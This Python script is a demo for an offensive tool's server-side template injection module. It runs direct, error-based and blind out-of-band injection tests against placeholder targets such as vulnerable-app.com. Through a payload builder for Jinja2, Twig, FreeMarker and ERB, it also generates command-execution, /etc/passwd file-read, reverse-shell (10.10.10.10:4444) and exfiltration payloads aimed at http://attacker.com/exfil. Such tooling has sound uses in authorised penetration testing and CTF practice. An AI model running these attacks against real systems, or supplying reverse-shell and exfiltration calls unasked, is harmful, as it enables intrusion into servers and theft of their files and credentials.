#!/usr/bin/env python3
"""
SSTI Module Demo

This script demonstrates the usage of the SSTI (Server-Side Template Injection) module.
"""

import asyncio
from app.modules.ssti import (
    SSTITester,
    SSTIPayloadBuilder,
    InjectionPoint,
    TemplateEngine,
    SSTIType,
)
from app.core.request_handler import RequestHandler
from app.core.oob_listener import OOBListener


async def demo_direct_ssti():
    """Demonstrate direct SSTI detection"""
    print("=" * 60)
    print("Demo 1: Direct SSTI Detection")
    print("=" * 60)
    
    # Initialize
    request_handler = RequestHandler()
    tester = SSTITester(request_handler)
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="name",
        location="query",
        original_value="guest",
        url="https://vulnerable-app.com/greet",
        method="GET",
    )
    
    print(f"\nTesting injection point:")
    print(f"  URL: {injection_point.url}")
    print(f"  Parameter: {injection_point.parameter}")
    print(f"  Location: {injection_point.location}")
    
    # Test for SSTI
    print("\nTesting for SSTI...")
    results = await tester.test_injection_point(
        injection_point,
        techniques=[SSTIType.DIRECT]
    )
    
    # Display results
    for result in results:
        print(f"\nResult:")
        print(f"  Vulnerable: {result.is_vulnerable}")
        if result.is_vulnerable:
            print(f"  Template Engine: {result.template_engine.value}")
            print(f"  SSTI Type: {result.ssti_type.value}")
            print(f"  Confidence: {result.confidence:.2%}")
            print(f"  Payload: {result.payload[:100]}...")
            print(f"\n  Evidence:")
            for evidence in result.evidence:
                print(f"    - {evidence}")


async def demo_error_based_ssti():
    """Demonstrate error-based SSTI detection"""
    print("\n" + "=" * 60)
    print("Demo 2: Error-Based SSTI Detection")
    print("=" * 60)
    
    # Initialize
    request_handler = RequestHandler()
    tester = SSTITester(request_handler)
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="template",
        location="post",
        original_value="default",
        url="https://vulnerable-app.com/render",
        method="POST",
        data={"template": "default", "content": "test"},
    )
    
    print(f"\nTesting injection point:")
    print(f"  URL: {injection_point.url}")
    print(f"  Parameter: {injection_point.parameter}")
    print(f"  Location: {injection_point.location}")
    
    # Test for error-based SSTI
    print("\nTesting for error-based SSTI...")
    results = await tester.test_injection_point(
        injection_point,
        techniques=[SSTIType.ERROR_BASED]
    )
    
    # Display results
    for result in results:
        print(f"\nResult:")
        print(f"  Vulnerable: {result.is_vulnerable}")
        if result.is_vulnerable:
            print(f"  Template Engine: {result.template_engine.value}")
            print(f"  SSTI Type: {result.ssti_type.value}")
            print(f"  Confidence: {result.confidence:.2%}")
            print(f"  Payload: {result.payload}")


async def demo_blind_oob_ssti():
    """Demonstrate blind SSTI with OOB detection"""
    print("\n" + "=" * 60)
    print("Demo 3: Blind SSTI with OOB Detection")
    print("=" * 60)
    
    # Initialize with OOB listener
    request_handler = RequestHandler()
    oob_listener = OOBListener()
    
    # Start OOB listener
    print("\nStarting OOB listener...")
    await oob_listener.start(http_port=8080, dns_port=5353)
    print(f"  HTTP listener: http://{oob_listener.domain}:{oob_listener.http_port}")
    print(f"  DNS listener: {oob_listener.domain}")
    
    tester = SSTITester(request_handler, oob_listener=oob_listener)
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="data",
        location="body",
        original_value='{"key": "value"}',
        url="https://vulnerable-app.com/api/process",
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    
    print(f"\nTesting injection point:")
    print(f"  URL: {injection_point.url}")
    print(f"  Parameter: {injection_point.parameter}")
    print(f"  Location: {injection_point.location}")
    
    # Test for blind SSTI
    print("\nTesting for blind SSTI with OOB...")
    results = await tester.test_injection_point(
        injection_point,
        techniques=[SSTIType.BLIND_OOB]
    )
    
    # Display results
    for result in results:
        print(f"\nResult:")
        print(f"  Vulnerable: {result.is_vulnerable}")
        if result.is_vulnerable:
            print(f"  Template Engine: {result.template_engine.value}")
            print(f"  SSTI Type: {result.ssti_type.value}")
            print(f"  Confidence: {result.confidence:.2%}")
            print(f"  OOB Callback ID: {result.oob_callback_id}")
            print(f"\n  Evidence:")
            for evidence in result.evidence:
                print(f"    - {evidence}")
    
    # Stop OOB listener
    await oob_listener.stop()


async def demo_payload_builder():
    """Demonstrate interactive payload builder"""
    print("\n" + "=" * 60)
    print("Demo 4: Interactive Payload Builder")
    print("=" * 60)
    
    # Test different template engines
    engines = [
        TemplateEngine.JINJA2,
        TemplateEngine.TWIG,
        TemplateEngine.FREEMARKER,
        TemplateEngine.ERB,
    ]
    
    for engine in engines:
        print(f"\n{engine.value.upper()} Payloads:")
        print("-" * 40)
        
        builder = SSTIPayloadBuilder(engine)
        
        # Command execution
        print("\n1. Command Execution (whoami):")
        cmd_payloads = builder.build_command_payload("whoami")
        for i, payload in enumerate(cmd_payloads[:2], 1):  # Show first 2
            print(f"   Payload {i}: {payload[:80]}...")
        
        # File reading
        print("\n2. File Reading (/etc/passwd):")
        file_payloads = builder.build_file_read_payload("/etc/passwd")
        for i, payload in enumerate(file_payloads[:2], 1):
            print(f"   Payload {i}: {payload[:80]}...")
        
        # Reverse shell
        print("\n3. Reverse Shell (10.10.10.10:4444):")
        shell_payloads = builder.build_reverse_shell_payload("10.10.10.10", 4444)
        for i, payload in enumerate(shell_payloads[:2], 1):
            print(f"   Payload {i}: {payload[:80]}...")
        
        # Data exfiltration
        print("\n4. Data Exfiltration:")
        exfil_payloads = builder.build_data_exfiltration_payload(
            "/etc/passwd",
            "http://attacker.com/exfil"
        )
        for i, payload in enumerate(exfil_payloads[:2], 1):
            print(f"   Payload {i}: {payload[:80]}...")


async def demo_custom_payloads():
    """Demonstrate custom payload creation"""
    print("\n" + "=" * 60)
    print("Demo 5: Custom Payload Creation")
    print("=" * 60)
    
    # Create builder for Jinja2
    builder = SSTIPayloadBuilder(TemplateEngine.JINJA2)
    
    print("\nAvailable Templates:")
    templates = builder.get_available_templates()
    for i, template in enumerate(templates, 1):
        print(f"  {i}. {template[:80]}...")
    
    # Customize a template
    print("\nCustomizing template 1 with custom command:")
    custom_payload = builder.customize_template(
        template_index=0,
        replacements={"COMMAND": "cat /flag.txt"}
    )
    print(f"  Custom Payload: {custom_payload[:100]}...")
    
    # Multiple custom commands
    print("\nGenerating payloads for multiple commands:")
    commands = ["id", "hostname", "cat /etc/os-release"]
    for cmd in commands:
        payloads = builder.build_command_payload(cmd)
        print(f"\n  Command: {cmd}")
        print(f"  Payload: {payloads[0][:80]}...")


async def demo_all_techniques():
    """Demonstrate testing with all techniques"""
    print("\n" + "=" * 60)
    print("Demo 6: Testing All Techniques")
    print("=" * 60)
    
    # Initialize
    request_handler = RequestHandler()
    oob_listener = OOBListener()
    await oob_listener.start(http_port=8080, dns_port=5353)
    
    tester = SSTITester(request_handler, oob_listener=oob_listener)
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="input",
        location="query",
        original_value="test",
        url="https://vulnerable-app.com/search",
        method="GET",
    )
    
    print(f"\nTesting injection point with all techniques:")
    print(f"  URL: {injection_point.url}")
    print(f"  Parameter: {injection_point.parameter}")
    
    # Test with all techniques
    print("\nTesting...")
    results = await tester.test_injection_point(injection_point)
    
    # Display results
    print(f"\nFound {len(results)} result(s):")
    for i, result in enumerate(results, 1):
        print(f"\nResult {i}:")
        print(f"  Vulnerable: {result.is_vulnerable}")
        if result.is_vulnerable:
            print(f"  Template Engine: {result.template_engine.value}")
            print(f"  SSTI Type: {result.ssti_type.value}")
            print(f"  Confidence: {result.confidence:.2%}")
            print(f"  Payload: {result.payload[:80]}...")
    
    await oob_listener.stop()


async def main():
    """Run all demos"""
    print("\n" + "=" * 60)
    print("SSTI Module Demonstration")
    print("=" * 60)
    
    try:
        # Run demos
        await demo_direct_ssti()
        await demo_error_based_ssti()
        await demo_blind_oob_ssti()
        await demo_payload_builder()
        await demo_custom_payloads()
        await demo_all_techniques()
        
        print("\n" + "=" * 60)
        print("All demos completed!")
        print("=" * 60)
    
    except Exception as e:
        print(f"\nError during demo: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(main())
